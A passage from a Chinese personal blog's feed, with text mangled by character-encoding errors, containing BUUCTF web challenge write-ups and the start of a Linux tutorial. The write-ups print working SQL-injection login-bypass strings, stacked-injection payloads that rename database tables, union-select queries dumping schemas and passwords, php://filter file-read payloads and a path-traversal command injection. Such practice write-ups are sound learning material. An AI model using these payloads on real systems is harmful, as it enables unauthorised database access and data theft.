class="line-numbers-rows"><span></span></span></code></pre><p>å¯çŸ¥ 1=1 æ˜¯ä¸ªæ’ç­‰å¼ï¼Œæ‰€ä»¥å°±ç™»é™†æˆåŠŸäº†ï¼Œå¾—åˆ°flag~</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948712.png"></p><p>ä¸‹é¢æ”¶é›†ä¸€äº›ä¸‡èƒ½å¯†ç ï¼š</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">'or'='or''or 1=1--''or 1=1--'or'a'='a"or "a"="a"or"="a'='a ')or('a'='aor 1=1--a'or' 1=1--"or"="a'='a'or''='1 or '1'='1'=11 or '1'='1' or 1=1'OR 1=1%00"or 1=1%00'xoradmin' or 'a'='a å¯†ç éšä¾¿<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="3-æå®¢å¤§æŒ‘æˆ˜-2019-Havefun"><a href="#3-æå®¢å¤§æŒ‘æˆ˜-2019-Havefun" class="headerlink" title="3.[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun"></a>3.[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun</h2><p>è¿™é¢˜è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„å“ˆï¼Œè¿›å»ä¹‹åå°±æ˜¯ä¸€å¼ å¯çˆ±çš„çŒ«çŒ«å›¾ï¼Œæœ‰ç‚¹ä¹–å“ˆå“ˆï¼ŒæŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œå‘ç°æœ‰ä¸€æ®µPHPä»£ç ï¼Œå°±æ˜¯getå‹å‚æ•°ä¼ å…¥ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948713.png"></p><p>ç„¶åæ„é€ payloadä¸ºï¼š<a href="http://49122460-5b04-4fd8-b15c-e5fad13e769c.node4.buuoj.cn:81/?cat=dog%E5%B0%B1%E5%8F%AF%E4%BB%A5%E4%BA%86">http://49122460-5b04-4fd8-b15c-e5fad13e769c.node4.buuoj.cn:81/?cat=dogå°±å¯ä»¥äº†</a>~</p><hr><h2 id="4-ACTF2020-æ–°ç”Ÿèµ›-Include"><a href="#4-ACTF2020-æ–°ç”Ÿèµ›-Include" class="headerlink" title="4.[ACTF2020 æ–°ç”Ÿèµ›]Include"></a>4.[ACTF2020 æ–°ç”Ÿèµ›]Include</h2><p>ä»é¢˜ç›®å¯ä»¥çœ‹å‡ºæ¥è€ƒå¯Ÿçš„æ˜¯æ–‡ä»¶åŒ…å«ï¼Œè¿›å…¥é¢˜ç›®çœ‹åˆ°tipï¼Œç‚¹å‡»ï¼Œç½‘é¡µè¿›è¡Œäº†è·³è½¬ï¼Œæ­¤æ—¶å‘ç°urlä¸ºï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948714.png"></p><p>å¯ä»¥çœ‹åˆ°åé¢æœ‰getå‹å‚æ•°fileå€¼ä¼ å…¥ï¼Œæ­¤æ—¶ä¼ å…¥å‚æ•°åå›æ˜¾ä¸ºè¿™å¥è¯ï¼Œé‚£æˆ‘ä»¬å°±ç›´æ¥é€šè¿‡==<strong>php://filterä¼ªåè®®</strong>==è¯»å–æ•´ä¸ªflag.phpï¼Œæ„é€ payloadä¸ºï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948715.png"></p><p>å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸²base64åŠ å¯†çš„ç¼–ç ï¼Œè§£å¯†åå¾—åˆ°flagï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"Can you find out the flag?"</span><span class="token punctuation">;</span><span class="token comment">//flag{0f1d073a-d716-4aa6-ae19-16dbba744a1d}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h2 id="5-å¼ºç½‘æ¯-2019-éšä¾¿æ³¨"><a href="#5-å¼ºç½‘æ¯-2019-éšä¾¿æ³¨" class="headerlink" title="5.[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨"></a>5.[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h2><p>ä»é¢˜ç›®çŸ¥åº”è¯¥æ˜¯SQLæ³¨å…¥ï¼Œè¿›å…¥é¢˜ç›®çœ‹åˆ°æœ‰ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œè¾“å…¥ 1 ï¼Œæ­£å¸¸è¿”å›ï¼ŒåŠ ä¸ª<strong>å•å¼•å· 1â€™</strong> è¿”å›SQLè¯­å¥é”™è¯¯ï¼Œå³å­˜åœ¨SQLæ³¨å…¥</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948716.png"></p><p>ç„¶åä½¿ç”¨order by 2,order by 3 æŸ¥çœ‹åˆ—æ•°ï¼Œå‘ç°<strong>åªæœ‰ä¸¤åˆ—</strong></p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948717.png"></p><p>å°è¯•ä½¿ç”¨è”åˆæŸ¥è¯¢union select å‘ç°å›æ˜¾è¯­æ˜¯<strong>selectè¢«æ­£åˆ™è¿‡æ»¤</strong>äº†</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948718.png"></p><p>emmm,å¼€å§‹å¤§å°å†™ã€è”åˆæ³¨é‡Šç­‰ç»•è¿‡waf,ä½†æ˜¯æ²¡å¾—ç”¨å°±å¾ˆæ°”å‘¦â€¦â€¦ï¼Œåæ¥æŸ¥äº†ä¸‹èµ„æ–™åŸæ¥æ˜¯å¿½ç•¥æ‰çš„<font color="#FF5E3A" size="4">å †å æ³¨å…¥ï¼</font>ï¼Œé‚£å°±å¼€å§‹ç›´æ¥æŸ¥çœ‹è¡¨åï¼š</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1';show tables; --+//åœ¨SQLä¸­ï¼Œåˆ†å·ï¼ˆ;ï¼‰æ˜¯ç”¨æ¥è¡¨ç¤ºä¸€æ¡sqlè¯­å¥çš„ç»“æŸã€‚å †å æ³¨å…¥å°±æ˜¯ç»“æŸä¸€ä¸ªsqlè¯­å¥åï¼Œä¼šç»§ç»­æ‰§è¡Œä¸‹ä¸€æ¡æ„é€ çš„SQLè¯­å¥ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948719.png"></p><p>ç„¶åå¯¹åº”æŸ¥çœ‹å¯¹åº”çš„åˆ—åï¼š</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1';show columns from words; --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948720.png"></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1';show columns from `1919810931114514`; --+   //å­—ç¬¦ä¸²ä¸ºè¡¨åæ“ä½œæ—¶è¦åŠ åå¼•å·<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948721.png"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬è¦çš„flagæ˜¯åœ¨å¯¹åº”çš„è¡¨ä¸­ï¼Œæ ¹æ®ç¬¬ä¸€æ¬¡è¾“å…¥ 1 çš„ç»“æœæ¥çœ‹åå°çš„è¯­å¥åº”è¯¥æ˜¯:</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select * from words where id = <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‰€ä»¥æˆ‘ä»¬ç›®å‰æœ€é‡è¦çš„å°±æ˜¯ä»å¦ä¸€ä¸ªè¡¨ä¸­è·å¾—æ•°æ®ï¼Œä½†æ˜¯æˆ‘ä»¬åªèƒ½ä» â€œwordâ€ è¿™ä¸ªè¡¨é‡Œå–æ•°æ®ï¼Œç„¶åçœ‹äº†åˆ«äººçš„æ–‡ç« å‘ç°è¿˜å¯ä»¥<strong>æ”¹è¡¨çš„åç§°</strong>æ¥è¯»flag! æ‰€ä»¥ï¼Œæ€è·¯å°±å¾ˆæ¸…æ™°äº†ï¼š</p><ol><li>æ›´æ”¹è¡¨çš„åç§°ã€‚å°†wordsæ”¹ä¸ºéšä¾¿å…¶ä»–çš„åå­—æ¯”å¦‚words1ï¼Œç„¶åå°†â€1919810931114514â€è¡¨çš„åå­—æ›¿æ¢ä¸ºwords</li><li>ç»™æ–°çš„wordsè¡¨å¢åŠ ä¸€åˆ—id</li></ol><p>æ„é€ payloadä¸ºï¼ˆæé†’ï¼š<font color="#FF5E3A" size="4"> å­—ç¬¦ä¸²ä¸ºè¡¨åæ“ä½œæ—¶è¦åŠ åå¼•å·ï¼ï¼ï¼</font>ï¼‰ï¼š</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1';rename table words to word1;rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; --+//è¿™é‡Œä½¿ç”¨äº†renameå’Œalertï¼Œå…·ä½“ç”¨æ³•å¯ä»¥æŸ¥ä¸€ä¸‹ï¼Œä¸åœ¨æ­£åˆ™è¿‡æ»¤çš„èŒƒå›´å†…//æ³¨æ„ä¸€å®šè¦ä½¿ç”¨åå¼•å·ï¼<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æ¥ç€å†æŸ¥çœ‹ä¸‹è¡¨ï¼Œå…¶å®å°±å·²ç»æŸ¥å‡ºæ¥flagäº†ï¼Œå•Štqlï¼Œå­¦åˆ°äº†~</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948722.png"></p><p>æœ€åæ„Ÿè°¢æœ‰äººå¤ç°è®©æˆ‘å­¦ä¹ ï¼š<a href="https://github.com/CTFTraining/qwb_2019_supersqli">https://github.com/CTFTraining/qwb_2019_supersqli</a></p><hr><h2 id="6-SUCTF-2019-EasySQL"><a href="#6-SUCTF-2019-EasySQL" class="headerlink" title="6.[SUCTF 2019]EasySQL"></a>6.[SUCTF 2019]EasySQL</h2><p>è¿™é¢˜ç»™æˆ‘æ•´ä¸ä¼šäº†ï¼Œåˆšå¼€å§‹è¯•äº†è”åˆä¸è¡Œï¼Œä¹Ÿæ²¡æŠ¥é”™ï¼ŒæŠ¥é”™æ³¨å…¥ä¹Ÿæ²¡äº†ï¼Œå¸ƒå°”ã€æ—¶é—´ä¹Ÿä¸å¾—è¡Œäº†ï¼Œåˆæ˜¯çœ‹åˆ«äººè§£é¢˜çš„ä¸€æ¬¡ï¼ŒåŸæ¥è¿˜å¯ä»¥çŒœåç«¯ä»£ç :æƒŠæ:ã€‚</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select $_GET['query'] || flag from flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åæ„é€ payloadä¸ºï¼š*,1(æˆ–è€…å…¶ä»–å¸¸æ•°)</p><p>æˆ‘æ¥ç€è‡ªå·±åœ¨æœ¬åœ°çš„testæ•°æ®åº“å°è¯•äº†ä¸€ä¸‹ï¼Œç›´æ¥æ„é€ ï¼š</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select 1 from salaries;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171042456.png" style="zoom:150%;"><p>ç¡®å®<strong>ç›´æ¥ select ä¸€ä¸ªå¸¸æ•°ä¼šç›´æ¥æ–°å¢ä¸€ä¸ªä¸´æ—¶çš„åˆ—ï¼Œå¹¶ä¸”æ¯ä¸€è¡Œçš„æ•°å€¼éƒ½æ˜¯è¿™ä¸ªå¸¸æ•°</strong>ï¼Œå†æ¥è¯´ä¸€ä¸‹è¿™ä¸ª || ï¼Œåœ¨mysqlé‡Œï¼Œ<strong>åªè¦ || å‰é¢çš„æˆç«‹ï¼Œåé¢çš„ä¾¿ä¸å†æ‰§è¡Œ</strong>ï¼ŒåŒç†ï¼Œå‰é¢çš„ä¸æˆç«‹ä¼šæ‰§è¡Œåé¢çš„ ã€‚å¦‚æœæˆ‘ä»¬ç›´æ¥æ„é€  :</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select *||salary from salaries<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171042458.png"></p><p>å¯ä»¥çœ‹åˆ°ä¼šæŠ¥è¯­æ³•é”™è¯¯ï¼Œæ‰€ä»¥æœ€ç»ˆå°±æ˜¯å¤§ä½¬çš„æ„é€ æ–¹æ³•ï¼š</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select *,1||salary from salaries<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171042459.png" style="zoom:150%;"><p>å¯ä»¥çœ‹åˆ°æ–°å¢åŠ äº†ä¸€åˆ—å¹¶ä¸”è¿™ä¸ªè¡¨ä¸­çš„æ•°æ®ä¹Ÿéƒ½æ˜¾ç¤ºå‡ºæ¥äº†ï¼Œå¤§ä½¬ä»¬ç‰›æ‰¹ï¼æœ€åè§£é¢˜æ‹¿flagï¼š</p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171042460.png" style="zoom:150%;"><h2 id="7-ACTF2020-æ–°ç”Ÿèµ›-Exec"><a href="#7-ACTF2020-æ–°ç”Ÿèµ›-Exec" class="headerlink" title="7.[ACTF2020 æ–°ç”Ÿèµ›]Exec"></a>7.[ACTF2020 æ–°ç”Ÿèµ›]Exec</h2><p>è€ƒå¯Ÿçš„æ˜¯<strong>è¿œç¨‹å‘½ä»¤æ‰§è¡Œ</strong>ï¼Œemmæˆ‘ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡åšè¿™ç§é¢˜ï¼Œç™¾åº¦äº†ä¸€ä¸‹ç½‘ç«™çš„pingæ¼æ´ï¼Œå‘ç°å¯èƒ½å­˜åœ¨è¿œç¨‹æ‰§è¡Œå‘½ä»¤çš„æ¼æ´ï¼Œå°±å¼€å§‹å°è¯•~</p><p>é¦–å…ˆè®²å‡ ä¸ªçŸ¥è¯†ç‚¹ï¼š</p><ul><li><p><strong>å‘½ä»¤è¿æ¥ç¬¦</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cmd1 <span class="token punctuation">;</span> cmd2 <span class="token punctuation">;</span> cmd3         åˆ†å· <span class="token punctuation">;</span> å¯ä»¥è¿›è¡Œå¤šæ¡å‘½ä»¤çš„æ— å…³è”æ‰§è¡Œï¼Œæ¯ä¸€æ¡æ‰§è¡Œç»“æœä¸ä¼šå½±å“å…¶ä»–å‘½ä»¤çš„æ‰§è¡Œcmd1 <span class="token operator">&amp;&amp;</span> cmd2               å·¦è¾¹çš„command1æ‰§è¡ŒæˆåŠŸ<span class="token punctuation">(</span>è¿”å›0è¡¨ç¤ºæˆåŠŸ<span class="token punctuation">)</span>åï¼Œ  <span class="token operator">&amp;&amp;</span>  å³è¾¹çš„command2æ‰èƒ½è¢«æ‰§è¡Œã€‚cmd1 <span class="token operator">|</span> cmd2                <span class="token operator">|</span> è¡¨ç¤ºç®¡é“ï¼Œä¸Šä¸€æ¡å‘½ä»¤çš„è¾“å‡ºï¼Œä½œä¸ºä¸‹ä¸€æ¡å‘½ä»¤çš„è¾“å…¥cmd1 <span class="token operator">||</span> cmd2               <span class="token operator">||</span> è¡¨ç¤ºä¸Šä¸€æ¡å‘½ä»¤æ‰§è¡Œå¤±è´¥åï¼Œæ‰æ‰§è¡Œä¸‹ä¸€æ¡å‘½ä»¤<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>ä¸‹é¢å¼€å§‹åšé¢˜ï¼š</p><p>é¦–å…ˆ<code>ls</code>æŸ¥çœ‹ä¸€ä¸‹å½“å‰ç›®å½•æœ‰æ²¡æœ‰flagæ–‡ä»¶ç­‰ï¼Œå‘ç°æ²¡å¾—ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171042461.png"></p><p>ç„¶åå°è¯•éå†çˆ¶ç›®å½•å¯ä»¥çœ‹åˆ°æœ‰flagæ–‡ä»¶ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171042462.png"></p><p>è¿™æ ·ç›´æ¥<code>cat ../../../flag</code>æ‹¿åˆ°flag:</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171042463.png"></p><h2 id="8-æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File"><a href="#8-æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File" class="headerlink" title="8.[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File"></a>8.[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File</h2><p>è€ƒå¯Ÿçš„æ˜¯<strong>ä¼ªåè®®è¯»å–æ–‡ä»¶</strong>ï¼Œéš¾ç‚¹å°±æ˜¯æ€ä¹ˆè¯»åˆ°flag.phpä¸­çš„flagã€‚</p><p>è¿›å…¥é¢˜ç›®æŸ¥çœ‹æºä»£ç å‘ç°æç¤ºæœ‰ï¼š/Archive_room.php ï¼Œæ¥ç€ç‚¹å‘ç°æœ‰ï¼š/action.php ï¼Œä½†æ˜¯è®¿é—®ç›´æ¥è¿‡å»äº†è·³åˆ°ï¼š/end.phpï¼Œå¼€å§‹æŠ“åŒ…ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171145471.png"></p><p>å‘ç°æœ‰secr3t.phpï¼Œè®¿é—®ä¹‹åçœ‹åˆ°ä¸€æ®µä»£ç ï¼š</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>secret<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token prolog">&lt;?php    highlight_file(__FILE__);    error_reporting(0);    $file=$_GET['file'];    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){        echo "Oh no!";        exit();    }    include($file); //flagæ”¾åœ¨äº†flag.phpé‡Œ?&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç›´æ¥è®¿é—®flag.phpä¼šå‡ºç°è´±è´±çš„è¯ï¼Œçœ‹ä¸åˆ°flagï¼Œçœ‹åˆ°phpä»£ç é‡Œæœ‰è¿‡æ»¤çš„ï¼Œå…ˆè§£é‡Šä¸‹è¿™ä¸¤ä¸ªå‡½æ•°ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">strstr</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span>search<span class="token punctuation">,</span>before_search<span class="token punctuation">)</span>æœç´¢å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­çš„ç¬¬ä¸€æ¬¡å‡ºç°ã€‚è¿”å›å­—ç¬¦ä¸²çš„å‰©ä½™éƒ¨åˆ†ï¼ˆä»åŒ¹é…ç‚¹ï¼‰ã€‚å¦‚æœæœªæ‰¾åˆ°æ‰€æœç´¢çš„å­—ç¬¦ä¸²ï¼Œåˆ™è¿”å› <span class="token boolean constant">FALSE</span>ã€‚ <span class="token function">stristr</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span>search<span class="token punctuation">,</span>before_search<span class="token punctuation">)</span>    ä¸åŒºåˆ†å¤§å°å†™çš„strstrï¼ˆï¼‰ç‰ˆæœ¬ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çœ‹åˆ°è¿‡æ»¤äº†inputã€dataï¼Œæ˜¯ä¼ªåè®®é‡Œçš„ï¼Œé‚£å°±è€ƒè™‘filterè¯»å–æ–‡ä»¶ï¼Œæ„é€ payload:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=flag.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¡µé¢è¿”å›flag.phpçš„æºç ï¼Œè§£å¯†åçœ‹åˆ°flagï¼š<code>flag{b3f2f2c1-5e4f-4b48-8bc5-1cf85ef574b2}</code></p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171145473.png"></p><h2 id="9-æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL"><a href="#9-æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL" class="headerlink" title="9.[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL"></a>9.[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL</h2><p>è€ƒå¯Ÿè”åˆæ³¨å…¥:</p><p>é¦–å…ˆåœ¨usernameå¤„è¾“å…¥<code>1'</code>,passwordè¾“ä¸ª1ï¼Œå‘ç°è¯­æ³•æŠ¥é”™ï¼Œå³å­˜åœ¨sqlæ³¨å…¥ã€‚æ¥ç€å…ˆæŸ¥çœ‹ä¸€ä¸‹å­—æ®µæ•°ï¼š</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1' order by 4 #   æŠ¥é”™1' order by 3 #   æ— æŠ¥é”™ï¼Œè¯´æ˜ä¸‰ä¸ªå­—æ®µ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç„¶åè¯•ä¸‹è”åˆæŸ¥è¯¢çˆ†ç ´æ‰€æœ‰æ•°æ®åº“ï¼š</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1' union select 1,2,group_concat(schema_name) from information_schema.schemata #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu/202201191050615.png"></p><p>çœ‹åˆ°æœ‰geekï¼Œå¤§æ¦‚ç‡å°±æ˜¯ä»–äº†ï¼Œæ¥ä¸‹æ¥æŸ¥çœ‹è¡¨åï¼š</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='geek' #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu/202201191050616.png"></p><p>æ¥ç€è¯•è¯•æŸ¥çœ‹l0ve1ysq1è¡¨é‡Œçš„åˆ—åï¼š</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1' #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu/202201191050617.png"></p><p>æœ€åå°±å¯ä»¥ç›´æ¥æ‹¿æ•°æ®äº†ï¼š</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1 #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¾—åˆ°flag{fbee60d0-759c-4012-a59b-bc0509fa5431}ã€‚</p><h2 id="10-GXYCTF2019-Ping-Ping-Ping"><a href="#10-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="10.[GXYCTF2019]Ping Ping Ping"></a>10.[GXYCTF2019]Ping Ping Ping</h2><p>åˆæ˜¯ä¸€é“å‘½ä»¤æ‰§è¡Œæ¼æ´çš„é¢˜ç›®ï¼Œä¸è¿‡å­˜åœ¨äº†å¾ˆå¤šè¿‡æ»¤ï¼Œè‡ªå·±è¯•äº†å¤šç§æ–¹æ³•ä¹Ÿä¸å¾—è¡Œï¼Œçœ‹äº†ä¸€ä¸ªå¸ˆå‚…çš„åšå®¢å­¦åˆ°äº†,tqlï¼Œç›´æ¥è´´é“¾æ¥å§ï¼š</p><p><a href="https://blog.csdn.net/weixin_39190897/article/details/116247765?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164256111016780274119167%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=164256111016780274119167&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-116247765.pc_search_result_control_group&amp;utm_term=ping%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/weixin_39190897/article/details/116247765?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164256111016780274119167%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=164256111016780274119167&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-116247765.pc_search_result_control_group&amp;utm_term=ping%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4187</a></p><hr><p>åˆ·äº†åé“é¢˜å’§ï¼Œå“ï¼Œè¿˜æ˜¯å¤ªèœäº†ï¼Œä¸æœæ…¢æ…¢æœ‰èŠ‚å¥äº†ï¼Œæ…¢æ…¢å­¦å§~</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948723.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="CTF" scheme="https://huhu-myh.github.io/categories/CTF/"/>
    
    
    <category term="buuç»ƒä¹ " scheme="https://huhu-myh.github.io/tags/buu%E7%BB%83%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>Linuxå­¦ä¹ -ç¬¬ä¸€ç« </title>
    <link href="https://huhu-myh.github.io/posts/myh10002.html"/>
    <id>https://huhu-myh.github.io/posts/myh10002.html</id>
    <published>2022-01-14T10:52:58.000Z</published>
    <updated>2022-01-17T08:17:52.641Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="ç¬¬ä¸€ç« ï¼šåˆè¯†Linux"><a href="#ç¬¬ä¸€ç« ï¼šåˆè¯†Linux" class="headerlink" title="ç¬¬ä¸€ç« ï¼šåˆè¯†Linux"></a>ç¬¬ä¸€ç« ï¼šåˆè¯†Linux</h2><h3 id="1-1-shell"><a href="#1-1-shell" class="headerlink" title="1.1 shell"></a>1.1 shell</h3><p>â€‹         Linux shellæ˜¯ä¸€ç§ç‰¹æ®Šçš„<font color="#FF5E3A" size="4">äº¤äº’å¼å·¥å…·</font>ã€‚å®ƒä¸ºç”¨æˆ·æä¾›äº†å¯åŠ¨ç¨‹åºã€ç®¡ç†æ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶ä»¥åŠè¿è¡Œåœ¨Linuxç³»ç»Ÿä¸Šçš„è¿›ç¨‹çš„é€”å¾„ã€‚ shellçš„<font color="#FF5E3A" size="4">æ ¸å¿ƒæ˜¯å‘½ä»¤è¡Œæç¤ºç¬¦</font>ã€‚å‘½ä»¤è¡Œæç¤ºç¬¦æ˜¯shellè´Ÿè´£äº¤äº’çš„éƒ¨åˆ†ã€‚å®ƒå…è®¸ä½ <strong>è¾“å…¥æ–‡æœ¬å‘½ä»¤ï¼Œç„¶åè§£é‡Šå‘½ä»¤ï¼Œå¹¶åœ¨å†…æ ¸ä¸­æ‰§è¡Œ</strong>ã€‚  </p><p>â€‹        shellåŒ…å«äº†ä¸€ç»„å†…éƒ¨å‘½ä»¤ï¼Œç”¨è¿™äº›å‘½ä»¤å¯ä»¥å®Œæˆè¯¸å¦‚å¤åˆ¶æ–‡ä»¶ã€ç§»åŠ¨æ–‡ä»¶ã€é‡å‘½åæ–‡ä»¶ã€æ˜¾ç¤ºå’Œç»ˆæ­¢ç³»ç»Ÿä¸­æ­£è¿è¡Œçš„ç¨‹åºç­‰æ“ä½œã€‚ shellä¹Ÿå…è®¸ä½ åœ¨å‘½ä»¤è¡Œæç¤ºç¬¦ä¸­è¾“å…¥ç¨‹åºçš„åç§°ï¼Œå®ƒä¼šå°†ç¨‹åºåä¼ é€’ç»™å†…æ 